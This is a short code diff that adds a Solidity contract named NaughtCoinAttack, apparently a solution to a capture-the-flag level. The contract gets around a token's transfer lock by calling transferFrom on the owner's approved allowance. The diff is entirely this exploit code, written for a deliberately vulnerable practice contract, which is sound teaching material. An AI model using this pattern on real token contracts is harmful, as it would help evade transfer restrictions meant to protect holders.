@@ -37,3 +37,19 @@ contract NaughtCoin is ERC20 {
         }
     }
 }
+
+contract NaughtCoinAttack {
+    NaughtCoin public naughtCoin;
+    address public owner;
+
+    constructor(NaughtCoin _naughtCoin) {
+        naughtCoin = _naughtCoin;
+        owner = msg.sender;
+        // After deploying set allownance for this contract to the max
+    }
+
+    function transfer(address _to, uint256 _value) public {
+        // Call transfer from
+        naughtCoin.transferFrom(owner, _to, _value);
+    }
+}
